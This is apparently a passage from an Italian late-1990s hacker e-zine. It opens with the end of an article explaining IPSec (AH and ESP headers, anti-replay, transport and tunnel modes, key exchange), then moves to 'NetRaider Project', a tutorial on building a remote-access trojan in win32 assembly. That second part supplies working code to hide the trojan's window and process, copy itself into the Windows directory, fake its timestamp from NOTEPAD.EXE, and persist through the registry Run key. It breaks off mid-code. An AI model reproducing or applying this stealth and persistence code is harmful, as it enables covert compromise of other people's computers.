	|		Authentication DATA 			|
	|		      variable				|
	---------------------------------------------------------

NextHeader, 8bit per identificare il tipo di header successivo ad AH.

PayLoad len, 8bit per specificare la lunghezza in parole a 32bit meno 2.

16bit riservati per usi futuri.

SPI, di cui abbiamo gia' parlato

Sequence Number, un numero di sequenza necessario per il rifiuto di
pacchetti gia' trasmessi.

Authentication Data, variabile, ma deve comunque essere un numero di
parole a 32bit che contiene il MAC del pacchetto.

AH fornisce un servizio AntiReplay per poter discriminare tra pacchetti
gia' ricevuti in modo da proteggersi da attacchi di ritrasmissione dei
dati. Questo servizio e' mediato dal numero di sequenza contenuto in AH.

Questo viene generato uguale a 0 ed incrementato per ogni pacchetto
generato all'interno della stessa SA. Di default il servizio antireplay e'
attivo, per cui chi trasmette non deve permettere al suo numero di
sequenza di superare 2^32-1, altrimenti ci sarebbero piu' numeri validi.
Per ovviare a cio' si scarta la SA in corso e se ne inizia una nuova.

Ricordiamo che IP puo' andare incontro a perdita o mancato ricevimento
sequenziale dei pacchetti. IPSec non fa eccezione, quindi la finestra di
accettazione dei pacchetti dovra' essere flessibile, ovvero di una
dimensione uguale a 64, col numero a destra come il piu' alto numero di
sequenza ricevuto. Ogni numero compreso tra N (il numero stesso) - 64 + 1
viene marchiato come ricevuto. Se viene ricevuto un pacchetto alla destra
della finestra e se il MAC corrisponde, la finestra avanza di uno. Se
viene ricevuto a sinistra viene scartato, cosi' come nel caso che il MAC
non sia valido e viene generato un log.

Ma come viene autenticato ogni pacchetto? Con il MAC per l'appunto.
Ovvero?! :)

Gli RFC specificano che si usi uno di questi due algoritmi per la gestione
del MAC: HMAC-MD5-96 e HMAC-SHA1-96. Non sta a me delucidarvi su questi
due algoritmi (ne avrei bisogno anche io :) ma posso dirvi con quali
elementi siano usati per autenticare il pacchetto.

Sostanzialmente usa elementi dell'header IP che siano immutabili o
prevedibili, poi tutto l'header AH ed infine il payload, che puo' essere
un semplice header di trasporto come TCP + dati, oppure tutto il pacchetto
IP nel caso di modalita' tunnel.

Gli elementi dell'header che non variano sono ihl e version e l'IP sorgente
ad esempio. Prevedibile e' l'IP destinatario. Campi variabili sono invece
il ttl ed il checksum che quindi vengono azzerati prima di essere
computati nel MAC. Dal momento che gli indirizzi IP vengono utilizzati per
il computo destinato all'autenticazione dei pacchetti, e' evidente come
questo possa proteggere dallo spoofing gli host che ne facessero uso. Per
IPv6 invece sono utilizzati la Versione (che non varia), l'indirizzo di
destinazione (variabile, ma prevedibile dalle tabelle di routing ad
esempio); mentre viene azzerato il Flow Label che e' invece totalmente
variabile.

MODALITA' DI TRASPORTO E TUNNEL

Per quanto riguarda IPv4 in modalita' trasporto, l'AH viene inserito dopo
l'header IP originale e prima del payload, comprensivo dei layer superiori;
L'autenticazione copre l'intero pacchetto, tranne che per quei campi
variabili suddetti che vengono azzerati nel computo del MAC.

			---------------------------------
prima			| IP Hdr | TCP Hdr |    Data	|
			---------------------------------

		-----------------------------------------
dopo		| IP Hdr | AH | TCP Hdr |    Data	|
		-----------------------------------------

per IPv6 invece, l'AH viene posto dopo gli header originali, anche quelli
estesi (tranne quello di opzioni per la destinazione che puo' essere prima
o dopo), ma non viene considerato o processato dai router intermedi, anzi
viene visto come normale payload punto-punto. Anche in questo caso
l'autenticazione copre l'intero pacchetto.

                	-----------------------------------------
prima           	| IP Hdr | Xtnd  | TCP Hdr |    Data    |
                	-----------------------------------------

                -------------------------------------------------
dopo            | IP Hdr | Xtnd | AH | TCP Hdr |     Data       |
                -------------------------------------------------

In modalita' tunnel invece, tutto il pacchetto e' si autenticato, ma l'AH
viene posto tra l'header originale ed il nuovo ed esterno header
incapsulante.

ESP - Encapsulating Security Payload

Questo protocollo permette ad IPSec di fornire servizi di confidenzialita'
dei dati. Puo' anche fornire opzionalmente gli stessi servizi di AH in
merito all'autenticazione dei dati stessi.

Ecco l'header ESP:

	0			16	    24		31
	-------------------------------------------------
	|	Security Parameters Index (SPI)		|
	-------------------------------------------------
	|		Sequence Number			|
	-------------------------------------------------
	|						|
	|						|
	|	    Payload Data (variable)		|
	|		---------------------------------
	|		|				|
	-----------------	-------------------------
	|	Padding (0-255)	| Pad Len  |  Next HDR	|
	-------------------------------------------------
	|	Authentication Data (variable)		|
	-------------------------------------------------

Beh, l'SPI l'abbiamo ormai visto e rivisto, identifica le SA.
Anche il numero di sequenza dovrebbe esser chiaro.

Payload data non e' altro che il segmento di trasporto o, nel caso di
modalita' tunnel, il pacchetto IP incapsulato.

Il PADDING e' importante. Serve a tre scopi:

- se un algoritmo per la crittografia dei dati richiede che il testo in
chiaro sia un multiplo di qualche valore, possiamo aumentare i dati fino a
renderli tali

- ESP richiede che i campi successivi siano allineati in una parola di
32bit. Oltretutto il testo cifrato dev'essere un multiplo intero di 32

- puo' essere usato per aumentare la confidenzialita' dei dati, oscurando
la reale lunghezza dei dati, una volta che siano stati cifrati

Pad len indica il numero di byte precedenti questo campo.

Next header identifica il tipo di dati contenuti nel payload, una volta
che sia stato cifrato.

Authentication data contiene il MAC computato su tutto il resto
dell'header ESP.

Gli algoritmi utilizzati nella crittografia dei pacchetti IP o dei payload
nel caso di semplice trasporto sono: triploDES con 3 chiavi, RC5, IDEA,
triploIDEA con 3 chiavi, CAST e Blowfish.

Per algoritmi che richiedano dati specifici come l'IV, initialization
vector, questi possono essere inseriti all'inizio del payload. La
specifica base richiede almeno il DES in CBC, cipher block chaining. Ogni
prodotto che sia stato certificato come IPSec compliant deve rispondere a
questi requisiti.

MODALITA' DI TRASPORTO E TUNNEL

In modalita' trasporto, ESP puo' essere utilizzato per criptare ed
autenticare i dati trasportati da IP, come con TCP. In questo caso
l'header ESP si trova tra l'originale IP e quello dei layer superiori.
Come avrete immaginato, se TCP e dati vanno nel campo payload di ESP, dove
finiranno gli altri campi di ESP? Semplicemente in un suffisso DOPO il
pacchetto IP originale. Avremo ad esempio per IPv4:

	--------------------------------------------------
	| IP hdr | ESP hdr | TCP hdr | data | ESPe | ESPa|
	--------------------------------------------------

dove ESPe include Padding, PAD len, next hdr ed ESPa invece
l'authentication data. Le operazioni di trasporto di ESP consistono in:

- alla sorgente il payload (TCP e dati) ed il suffisso ESP, o trailer,
vengono crittati. Nel caso di autenticazione si aggiunge il campo apposito
e si calcola il MAC.

- ogni hop puo' esaminare l'header, ma NON il payload cifrato

- alla destinazione, in possesso delle chiavi, il payload viene decrittato
in base all'SPI dell'header ESP.

La modalita' tunnel e' diventata famosa con l'avvento delle VPN. In questo
caso viene criptato TUTTO il pacchetto IP e poi incapsulato in un altro
con gli indirizzi dei gateway. In questo caso l'ESP si trova prima dell'
header originale, ma DOPO il nuovo header IP.

In questo caso il peso dei processi criptograffici investe solo i sistemi
che si occupano del routing in internet, laddove gli host sulle LAN
protette possono inviare tranquillamente i loro pacchetti in chiaro,
sicuri che il firewall mediante la gestione delle SA, incapsuli le loro
connessioni tra un gateway e l'altro.

- la sorgente preleva il pacchetto, gli prepende un ESP, postpende il
trailer e cripta tutto il pacchetto, dopodiche' lo incapsula in un altro
IP e lo invia

- gli hop intermedi possono solo processare gli header esterni aggiunti
dal router IPSec e non i dati criptati.

- alla destinazione il pacchetto viene liberato dall'incapsulamento e
decriptato per essere poi inviato in chiaro nella LAN protetta.

E' chiaro che le varie SA possano essere combinate per venire incontro
alle esigenze delle varie configurazioni di rete. In due modi
sostanzialmente: mediante adiacenza o tunnel iterativo. Nel primo caso si
decide di utilizzare l'AH e l'ESP indipendentemente sullo stesso
pacchetto, in maniera sequenziale, mentre nel secondo modo si inseriscono
tunnel uno dentro l'altro, un po' come per i remailer cipherpunk.

GESTIONE DELLE CHIAVI

Come abbiamo visto sono necessarie chiavi segrete sia per il MAC dell'AH
che per gli algoritmi dell'ESP. Ebbene e' inutile girarci intorno. :) Ci
sono in pratica solo due modi: o gestirle in un database statico, nel caso
le comunicazioni siano limitate a pochi sistemi, oppure mediante un
sistema sicuro di presentazione dinamica delle chiavi.

Per questo secondo metodo si usano due protocolli specificati negli RFC:
ISAKMP e Oakley.

Il primo non si occupa letteralmente della gestione delle chiavi. In
realta' serve a negoziare tra le parti in modo da poter gestire le chiavi
con il protocollo Oakley. Questo e' una modifica dell'algoritmo
Diffie-Hellman. Tale modifica si basa sull'uso di gruppi di calcolo di
cookie utilizzati per l'estrapolazione di una comune chiave di sessione
cercando di proteggersi da attacchi tipo man-in-the-middle. Eventualmente
le parti in gioco possono anche utilizzare firme digitali basate su hash
ottenibili da userid ed altri parametri, oppure mediante crittazione a
chiave pubblica ....

Non e' compito di questo articolo la presentazione degli algoritmi per lo
scambio e la gestione delle chiavi, quanto presentare una introduzione
all'architettura di IPSec. 

Per chi volesse saperne di piu' e' consigliabile rivolgersi a testi di un
certo calibro e peso :) tipo Applied Cryptography di B.Schneier o
Cryptography and Network Security di W.Stallings.

Questo e' in soldoni un primo "what's!??!" su IPSec. Ovviamente non deve
bastarvi questo se siete realmente interessati. Gli RFC che ho nominato
possono fare per voi. Come al solito un buon libro potra' di certo esser
d'aiuto per TCP/IP in generale, e saprete ormai a memoria quale suggerirei, 
vero?! :P

Per gli aspetti relativi alla sicurezza sull'uso delle chiavi rifatevi ai
libri che ho nominato piu' sopra per la criptografia.

ED IL CODICE ?!

Sorry, ma non c'e' codice in questo articolo. Iiiiihhhhhh!
Lo so :) ma non c'e' molto in giro. Anche per Linux sono dolori al
momento. Dovreste patcharvi il kernel per usare il modulo x-kernel su cui
stanno sviluppando un applicazione IPSec free. Cercate su altavista
ipsec+xkernel+linux e ci arriverete. Al momento vi dovete accontentare di
IPv6. Cercate nella dir /usr/src/linux/net/ipv6 del kernel 2.2.x e
guardate anche in /usr/src/linux/Documentation .

Ma ci sara' sicuramente tempo per i codici e gli attacchi/difese. Non
manca ancora molto ad IPv6 ed IPSec: arriveranno prima che tutti voi vi
siate stufati di questi giochi :) ed allora per ballare bisognera' capire
e codare, come sempre...

See you there,
						FuSyS


--------------------------[ NET RAiDER PR0JECT v0.0 ]-------------------------
---------------------------------[ \sPIRIT\ ]---------------------------------

                           NetRaider Project v0.0

                                   ovvero

                       Davide contro Golia & famiglia
                           donna nana, tutta tana
                     piccolo si', ma con un c...o cosi'
                     e' poco, ma e' di quello buono...

                                     -

Tempo impiegato  : svariati giorni di full immersion globale
Consumo          : numerosi piatti di pasta al tonno e bastoncini Findus
                   bottiglie da 66cl di birra Peroni (thx Berry :)
                   litri di pepsi
                   una stecca di Diana Blu
                   circa sei moke di caffe' al giorno, miscela Discount
Musica ascoltata : quattro sPIRITCD.MP3 a ripetizione (2.5gb di bella roba)
Stati d'animo    : dal paranoico suicida all'euforico cocainomane
Dediche          : a tutti i fratelli del s0ftpr0ject
                   a Sabrina per il supporto fisico :)
                   alla fine della mia carriera universitaria (coming soon)
Si fanculizzi    : chi vuole sempre la pappa pronta (niente per loro, qui)
                   chi ha ideato le API di Windows 9x
                   chi ha detto che fumare fa' male (COFF COFF...)

                              - L'APPROCCIO -

Per seguire bene e mettere in pratica quanto scritto nell'articolo che
segue sono necessarie un po' di cosette.
Prima di tutto una testa (questa era scontata) e una conoscenza base della
sintassi dell'assembly e delle modalita' di programmazione dell'ambiente
Windows.
Se programmate gia' in assembly a 32bit sotto il buon vecchio DOS vi basta
un tutorial qualunque che spieghi i concetti base della programmazione
win32 e una referenza delle API. Se programmate gia' in C/C++ o Delphi vi
basta studiare un po' l'assembly, se siete crackers non vi serve nulla,
direi che siete gia' pronti :)
Anche dal fronte tools le richieste non sono insormontabili.
E' necessario il MASM 6.1x. con relative librerie e include, un resource
compiler, una referenza delle API e possibilmente un po' di documentazione.
Tutto il necessario lo trovate in confezione regalo alle pagine
http://win32asm.cjb.net e http://iczelion.cjb.net (e relativi links).

               - I PRELIMINARI (che sono sempre importanti) -

La prima cosa che vi conviene sapere, nel caso abbiate distrattamente
eseguito il server mentre giocavate col programmino, e' che l'eseguibile si
installa nella vostra directory base di Windows, sotto il nome di
RSRCNRS.EXE e con la stessa data di creazione di NOTEPAD.EXE (controllate
pure, controllate). Per rimuovere anche la sporcizia dal registry, la
chiave e' HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
sotto il nome di "Rsrcnrs". Inutile chiamare il task manager con
CTRL-ALT-CANC per segare il processo, che tanto non lo vedete... vi
conviene rimuovere il server dalla memoria utilizzando il client e
cancellare a mano l'eseguibile (infatti la funzione Remove Server termina
il processo e cancella la chiave nel registry, non puo' eliminare
fisicamente l'eseguibile per motivi di file sharing che sto' cercando di
risolvere).
La seconda cosa, e qui sono martellate ai piu' svogliati, e' che questo
articolo non e' ne' un corso di assembly, ne' tantomeno un corso di
assembly in ambiente WIN32, o sapete la sintassi, o non e' un mio problema.
Inoltre, per aumentare l'astio nei miei confronti, per ricompilare il tutto
avete bisogno di un tot di tools (per carita', niente di fantascientifico)
che vi ho indicato poco sopra e che io non vi ho messo nel pacchetto.
Attaccate il vostro browserino e procurateveli, se gia' non li avete, che
servono sempre.
Se volete sperimentare il NetRaider cosi' com'e', gli eseguibili li ho
inclusi per questo.
Una precisazione necessaria: l'assembly lo uso da quasi otto anni, la mia
prima finestrella a base di MOV risale a meno di due mesi fa, tutte le
conoscenze che sono state utilizzate per questo articolo sono frutto di
tentativi alla cieca, di ore a diassemblare trojan gia' esistenti e di una
intensiva spulciatura selettiva del Microsoft Journal e delle DLL di
Windows. Se avete culo trovatevi il libro Windows Undocumented di quel
pazzo psicotico di Matt Pietrek: e' del '96, e vista l'alta percentuale di
introvabilita' e' un po' come un sei al Superenalotto giocando un paio di
millini (in alternativa c'e' in giro la versione PDF, ma sono 60mb...).

                  - L'INTRODUZIONE (dopo i preliminari) -

La moda degli ultimi sei mesi. Piu' seguita delle bocce di Laetitia Casta,
piu' richiesta di una camicia di Dolce & Gabbana. I paparazzi si
appostano per fotografare le soubrette, gli informatici passano ore in
intense fasi di scanning di intere classi di IP.
Microsoft, con la solita faccia di bronzo, mostra di non preoccuparsi
ostentando nonchalance. Una notte di sesso con la suddetta Laetitia, e anche
Bill Gates si chiederebbe chi cazzo glielo ha fatto fare di passare la vita
a distribuire log di /dev/random spacciandoli per applicativi e sistemi
operativi, con buona pace dei linux-maniaci.

Accendete il vostro fido Windows, e controllate. Con molte probabilita' ne
avete uno anche voi, un trojan nascosto in qualche angolino buio, pronto a
spettegolare al primo che passa i segreti del vostro pc.
E se non l'avete voi, sicuramente ce l'ha qualcuno che conoscete, il vostro
compagno di banco, il vicino, il professore, il capoufficio, il parroco, il
pusher di fiducia, la vostra ragazza (ma in questo caso si chiama "essere
ninfomani"...). Con questa diffusione su scala planetaria, sembra di essere
tornati a qualche anno fa', quando si diceva che DOOM fosse installato su
un pc ogni due. Senza esagerare, pero'.

Ecco l'utente normale che si sente hacker. Manie di onnipotenza e cose
simili, <Quello ha il Back Orifice, ora lo sfotto e gli formatto l'hard
disk!>, di quelli che conosco chi ha cercato di capire come funzionano 'ste
cose sono gli stessi che hanno riempito di bytes questo numero di BFi, e
pochi altri, il resto e' una massa di utenti fruitori di servizio senza la
minima cognizione di cosa in realta' accada. Tanto varrebbe abbattere le
statue di Garibaldi e sostituirle con altarini alla cDc, se non altro
perche' sono stati i primi.
Oddio, non fraintendete, rispetto massimo per quei pazzi, ma personalmente
non darei mai un Kalashnikov carico in mano ad un tipo che si gusta per la
miliardesima volta Full Metal Jacket, e sempre con la stessa bava alla
bocca ed espressione sognante...

Oh... sono scaduto ancora nella polemica... let's go ahead.

                           - SIZE *DOES* MATTER -

Ora, prima di proseguire, leggete questo piccolo taglia e incolla di una
mia directory. Dentro ci sono gli eseguibili di quattro esemplari d
trojan:

 Volume in drive D is SOFTPJ99
 Volume Serial Number is 4154-14E8
 Directory of D:\Spirit\work in progress\NetRaider Project\other servers

.              <DIR>        02-11-99  5:39p .
..             <DIR>        02-11-99  5:39p ..
BOSERVE  EXE       124,928  08-03-98 10:02p BOSERVE.EXE
PATCH    EXE       472,576  08-23-98  1:06a Patch.exe
AGENT    EXE       293,376  06-11-98  1:54a Agent.exe
WINDLL   EXE       344,064  11-20-98 10:20p windll.exe
         4 file(s)      1,234,944 bytes
         2 dir(s)     243,924,992 bytes free

Nel caso non li riconosciate, ecco una veloce guida alle specie presentate
di "trojanibus stronzus":

BOSERVE.EXE - Back Orifice, versione 1.20
PATCH.EXE   - NetBus 1.60
AGENT.EXE   - Master's Paradise v0.98
WINDLL.EXE  - Girlfriend v1.35

La maggiore diffusione si e' avuta per mezzo di IRC, con amici che
passavano ad "amici", con sedicenti santoni che distribuivano toccasana
contro flood, nukes, impotenza e mancanza di figa. Altrimenti di mano in
mano, un dischetto alla volta... fate due conti sul numero di lamerazzi che
popolano Internet, e avrete in mano senza bisogno di calcolatrice la
velocita' di "trasmissione" e la quantita' di "contagiati".
Pero' guardate le dimensioni di quei files... <espressione di sdegno>
Sono GROSSI.
Sebbene il trend ci abbia abituato a viaggiare con programmi nell'ordine di
grandezza dei megabytes, quelle cifre restano (per me, voi non so')
un'offesa per gli occhi. Il motivo di quella mole e' presto spiegato: sono
stati programmati tutti in linguaggi ad alto livello, per il Back Orifice
e' il C++, per NetBus e Girlfriend e' il Delphi, e non mi sono preso la
briga di controllare il Master's Paradise.

La domanda che ci assegna il montepremi e' la seguente:
UNA VOLTA CAPITO IL FUNZIONAMENTO, E' POSSIBILE RIDURRE LE DIMENSIONI?

Vi anticipo la risposta, ma non limitatevi ad essa, che le condizioni e
spiegazioni seguiranno:

 Volume in drive D is SOFTPJ99
 Volume Serial Number is 4154-14E8
 Directory of D:\Spirit\work in progress\NetRaider Project

.              <DIR>        02-05-99  9:08p .
..             <DIR>        02-05-99  9:08p ..
NETSERV  EXE         5,021  02-28-99  2:22p netserv.exe
         1 file(s)          5,037 bytes
         2 dir(s)     243,924,992 bytes free

Guardate bene quel numerino... si', non sono allucinazioni da LSD, ma
proprio 5021 bytes (almeno al momento in cui scrivo questo articolo).

Sveliamo il trucco(1): l'eseguibile e' compresso con UPX 0.51
Vedo dalle vostre espressioni maligne che siete pronti a mettermelo in
culo. Ora col suddetto UPX scomprimetelo, o in alternativa ricompilate i
sorgenti che vengono con questo articolo.
Risultato: meno di 11k...
...e andate a comprarvi la vaselina per la prossima volta <evil grin>

Sveliamo il trucco(2): e' tutto scritto in puro assembly win32, e non e'
nemmeno ottimizzato per spazio, si potrebbe segare da questa versione un k
e mezzo comodo comodo. Alcune prove mi portano a 9k il compilato e a 4.7k
il compresso.
I piu' bastardi potrebbero farmi (giustamente) notare che ora come ora il
tutto non fa' niente di utile, e spiegare cosi' le ridottissime dimensioni.
Mazzate sui denti anche a loro: il server e' perfettamente funzionante, si
installa, si nasconde, e le routines di gestione pacchetti masticano con
tranquillita' dai messaggi nelle Message Box ai files di svariati mega,
tutto in maniera trasparente. Pensate di aggiungere tutte le funzioni di un
Back Orifice standard, e per ognuna aggiungete idealmente poco piu' di un
kbyte all'eseguibile NON COMPRESSO... poi stimate una compressione media
di circa il 40% per il puro codice (ed e' tutto codice...).
Per quanto perversa possa essere la vostra immaginazione, saranno numeri al
di sotto del 90, giocateveli al lotto e chissa' che non vinciate qualcosa.

(I piu' bastardi dovrebbero solo stare zitti e provare a creare per es. col
Delphi un programma VUOTO con solo la finestra Main e vedere quanto occupa
gia' cosi'... piu' di 100k,  l'alternativa e' solo lavorare in modalita'
Console (senza GUI) perdendo pero' la possibilita' di utilizzare 3/4 delle
classi gia' presenti nel linguaggio (e si ha cque una 50ina di kappa di
exe) NDCavallo)

Parziale alla fine del primo tempo: NetRaider VS Resto Del Mondo 1-0

                       - SU E GIU' (per il codice) -

Andiamo per gradi, che forse e' meglio. L'approccio da seguire per la
creazione di un trojan che ritengo migliore e' questo:

1) Creazione di un programma che si nasconda nel sistema e venga lanciato
   ad ogni avvio del sistema (la base di quello che sara' il server)
2) Creazione di un programma con un minimo di interfaccia (la base del
   client)
3) Interfacciamento dei due programmi con le Winsock, uno in grado di
   accettare connessioni (FD_ACCEPT) e uno che possa connettersi
   (FD_CONNECT)
4) Implementazione di uno straccio di Handshake fra i due programmi
5) Implementazione di una routine in grado di gestire l'invio di pacchetti
   e di un'altra in grado di ricevere i suddetti (e di conseguenza
   ideazione di un modello standard di pacchetto utilizzabile per lo
   scambio di dati)
6) Implementazione di tutti i giochetti simpatici sia a livello di
   richiesta (client) che a livello di esecuzione remota (server)

Quando tutti e sei i livelli sono stati sviluppati, avete in mano un trojan
pronto da usare (e da ottimizzare, ma questo e' un discorso che non intendo
trattare).

Cominciamo a descrivere il NetRaider a partire (ovviamente) dal punto uno.

1) LA BASE DI QUELLO CHE SARA' IL SERVER

Supponiamo per semplicita' (ricordate: non e' il mio scopo trattare la
programmazione basilare di Windows) di avere un programma che tramite la
funzione CreateWindowEx apre una bella finestrella vuota sullo schermo,
associata tramite la RegisterClassEx ad un nome arbitrario, nel nostro caso
"Nrs" (Netraider server). La prima cosa da fare e' renderla invisibile
all'utente, cosa ottenibile chiamando la seguente funzione:

BOOL ShowWindow(
     HWND  hwnd,      // handle of window
     int   nCmdShow   // show state of window
);

dove hwnd e' l'handle della finestra creata, ottenuto dalla chiamata a
CreateWindowEx, e nCmdShow e' un intero ottenuto facendo l'OR fra una serie
di parametri di visualizzazione. A noi interessa rendere la finestra
invisibile, quindi il parametro nCmdShow conterra' il valore SW_HIDE. Una
bella chiamata tipo:

INVOKE ShowWindow, hwnd, SW_HIDE

e la nostra finestrella sparira' per sempre.
Ora torniamo indietro, piu' precisamente all'inizio del programma, e
siccome noi non vogliamo che l'utente lanci piu' processi del server per
sbaglio (ad esempio, nel momento in cui manda in esecuzione il server per
la prima volta vede che apparentemente non succede nulla, e per sicurezza
ci clicca sopra un altro po' di volte), e' consigliabile controllare che in
esecuzione non esista gia' una copia del programma. Per fare questa
semplice operazione si utilizza la funzione FindWindowEx, definita come
segue:

HWND FindWindowEx(

     HWND     hwndParent,       // handle of parent window
     HWND     hwndChildAfter,   // handle of a child window
     LPCTSTR  lpszClass,        // address of class name
     LPCTSTR  lpszWindow        // address of window name
);

Il parametro lpszClass deve puntare ad una stringa ASCIIZ contenente il
nome della classe a cui e' associato il nostro programma, in questo caso
"Nrs". Una chiamata a:

INVOKE FindWindowEx, NULL, NULL, ADDR stringa.col.nome.della.classe, NULL

restituira' in EAX un bel NULL se non sono state trovate altre finestre,
visibili o no, con quel nome di classe. Di conseguenza se sara' restituito
un valore diverso da NULL una copia del programma sara' gia' in esecuzione,
e noi usciremo con una bella chiamata a ExitProcess.

A questo punto all'utente meno smaliziato il programma server potrebbe
sembrare invisibile, ma richiamare la lista dei processi con CTRL-ALT-CANC
svelera' irrimediabilmente un processo in esecuzione di troppo (con lo
stesso nome dell'eseguibile che lo ha creato, se chiamate il server
"Pippo.exe" nella lista dei task ci sara' bello pacifico un "Pippo").
L'unica soluzione e' far ricorso ad una funzione non documentata di
Windows, chiamata RegisterServiceProcess.
Purtroppo il procedimento per richiamarla e' piu' laborioso del solito, ma
ne vale la pena. Questo e' il codice utilizzato nel NetRaider server:

getDLLHandle    db "kernel32",0
reqAPIProcedure db "RegisterServiceProcess",0

INVOKE GetModuleHandle, ADDR getDLLHandle
INVOKE GetProcAddress, eax, ADDR reqAPIProcedure
push   00000001
push   NULL
call   eax
add    esp,8

Tutto questo lavoro e' necessario perche' non e' possibile chiamare la
RegisterServiceProcess direttamente, ma bisogna ottenere dalla DLL che la
contiene (KERNEL32.DLL) l'indirizzo in cui e' stata mappata. Il tutto
avviene in maniera (quasi) indolore ottenendo con GetModuleHandle l'handle
della DLL KERNEL32, e in seguito richiedendo con GetProcAddress l'indirizzo
della funzione richiesta.
I due push che compaiono prima della chiamata non sono altro che i
parametri richiesti dalla RegisterServiceProcess, e in particolare il primo
e' il tipo di servizio richiesto, scelto fra:

RSP_SIMPLE_SERVICE     EQU 00000001h //register as service process
RSP_UNREGISTER_SERVICE EQU 00000000h //unregister the service process

mentre il secondo sarebbe l'ID del processo da registrare, nel nostro caso
NULL significa il processo corrente. L'importante dopo la chiamata
all'offset della RegisterServiceProcess e' di aggiustare il puntatore allo
stack, dal momento che non si utilizza la macro INVOKE del masm.
Una veloce verifica alla lista dei task col solito CTRL-ALT-CANC, e il
nostro programma sara' magicamente sparito... la vita comincia a
sorriderci.
In verita' la funzione RegisterServiceProcess, che esiste solo sotto
Windows 9x, serve a simulare un processo NT non collegato ad un utente, ma
globale. In ogni caso per i nostri scopi e' perfetta. E' da notare comunque
che con programmi particolari come il Process Viewer e il Tek Factory il
nostro processo sara' comunque visibile, ma vi sfido a trovare un utente
comune che li utilizzi...
Questa informazione preziosissima e' stata trovata su Computer Programming
n.74, in un articolo di Fabio Falsini dal titolo "Lo sapevate che c'e' una
funzione per...".
Cavallo dice che lo sapeva gia'... 'fanculo :)

Ora che il processo risultera' completamente invisibile, e' necessario
scrivere il codice che installi il trojan nel sistema alla prima
esecuzione, e che lo stesso venga eseguito ad ogni boot della macchina.

La prima cosa da fare e' copiare l'eseguibile del server in una directory a
nostro piacimento. Ho scelto la directory base di windows per evidenti
motivi, dato che e' gia' piena di eseguibili sara' difficile che qualcuno
scovi un eseguibile di troppo. La copia avviene in tre fasi: prima si
ricava con la funzione GetWindowsDirectory il path alla directory
principale di windows, quindi con la GetCommandLine il path completo
dell'eseguibile lanciato dall'utente (il nostro trojan), e con un po' di
taglia e incolla su buffer otteniamo il path + filename dove verra' copiato
l'eseguibile. Il codice e' il seguente:

INVOKE  GetWindowsDirectory, ADDR WinBASEDIR, MAX_PATH

INVOKE  StrLen, ADDR WinBASEDIR

mov     edi, OFFSET regKeyValue
mov     esi, OFFSET WinBASEDIR
mov     ecx, eax
rep     movsb
mov     al,'\'
stosb
mov     esi, OFFSET ExecutableName
mov     ecx, ExecutableLength
rep     movsb

INVOKE  GetCommandLine
mov     CommandLine, eax

INVOKE  StrLen, CommandLine
mov     edi, OFFSET InstallExePATH
mov     esi, CommandLine
inc     esi
mov     ecx, eax
sub     ecx,3
rep     movsb

INVOKE  CopyFile, ADDR InstallExePATH, ADDR regKeyValue, FALSE

A questo punto il nostro trojan e' al posto giusto, e una bella cosa
sarebbe cambiare la data del file in qualcosa di poco vistoso, dato che un
eseguibile del '99 in mezzo a tanti eseguibili con date precedenti potrebbe
destare piu' di un sospetto. In questo caso ho deciso di prendere la data
di NOTEPAD.EXE (uno dei programmi che piu' o meno siamo sicuri sia
installato nel sistema) e usarla per cambiare la data del NOSTRO
eseguibile. Ecco il codice:

INVOKE  GetWindowsDirectory, ADDR WinBASEDIR, MAX_PATH
INVOKE  StrLen, ADDR WinBASEDIR

mov     edi, OFFSET stealthFilePath
mov     esi, OFFSET WinBASEDIR
mov     ecx, eax
rep     movsb
mov     al,'\'
stosb
mov     esi, OFFSET stealthFileName
mov     ecx, stealthFileLen
rep     movsb

INVOKE  CreateFile, ADDR stealthFilePath, GENERIC_READ, FILE_SHARE_READ, \
        0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
.IF eax!=INVALID_HANDLE_VALUE
    mov     hFile4date, eax
    INVOKE  GetFileTime, hFile4date, ADDR stealthFileInfo, NULL, NULL
    INVOKE  CloseHandle, hFile4date
    INVOKE  CreateFile, ADDR regKeyValue, GENERIC_WRITE, \
            FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, \
            NULL
    mov     hServer, eax
    INVOKE  SetFileTime, hServer, ADDR stealthFileInfo, \
            ADDR stealthFileInfo, ADDR stealthFileInfo
    INVOKE  CloseHandle, hServer
.ENDIF

La funzione CreateFile e' usata in questo caso per aprire NOTEPAD.EXE in
lettura, e la GetFileTime per riempire una struttura predefinita con la
data del file aperto. Quindi viene aperto il file del trojan in scrittura
(GENERIC_WRITE) e viene copiata la data. Le flag FILE_SHARE_READ e
FILE_SHARE_WRITE sono necessarie per attivare la lettura/scrittura in caso
di file gia' aperto (ad esempio se l'utente avesse un NOTEPAD.EXE lanciato,
senza la FILE_SHARE_READ non sarebbe possibile ricavare la data).

Ora l'eseguibile trojan ha anche una data di creazione soddisfacente, e
bisogna preoccuparsi che esso venga eseguito ad ogni boot del sistema.
L'esecuzione automatica all'avvio non costituisce un problema. Le
alternative a disposizione sono tre: avvio da Esecuzione Automatica, avvio
da SYSTEM.INI, avvio da Registry.
La prima alternativa e' da scartare completamente, l'esecuzione sarebbe
troppo evidente. Una sezione [load] inserita nel SYSTEM.INI e' gia' meglio,
ma e' troppo complesso, per i nostri scopi, aprire il file e inserire
i comandi. Resta l'esecuzione da registry, effettivamente l'ideale.

La nostra chiave di esecuzione andra' inserita nella sezione
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
e conterra' il path del nostro eseguibile.

INVOKE  RegSetValueEx, hNETSERVERkey, ADDR regKeyName, 0, REG_SZ, \
        ADDR regKeyValue, eax

Questa funzione provvedera' a inserire nel registry (e a creare, se gia'
non esiste) la nostra chiave. Il valore a cui viene settata e' lo stesso
usato come path di destinazione della nostra copia del trojan.

Gli ultimi passi all'installazione sono banali. Una ShellExecute
provvedera' a lanciare l'eseguibile copiato, mentre una ExitProcess
chiudera' il processo corrente (lanciato dall'utente), per evitare
interferenze.
L'ultima nota riguarda il fatto che l'utente potrebbe, non notando alcuna
attivita' al suo doppio click, rilanciare l'esegubile, e non sarebbe carino
che ogni volta venisse ripetuta tutta la procedura (anche perche', nel caso
di server in esecuzione, ci sarebbero svariati problemi di file sharing al
momento della copia del file...).
Tornando all'inizio del sorgente, una verifica della presenza della chiave
nel registry dovrebbe bastare. Se la chiave verra' trovata, il processo
rilanciato verra' terminato immediatamente.

INVOKE  RegOpenKeyEx, HKEY_LOCAL_MACHINE, ADDR regKeyPosition, 0, \
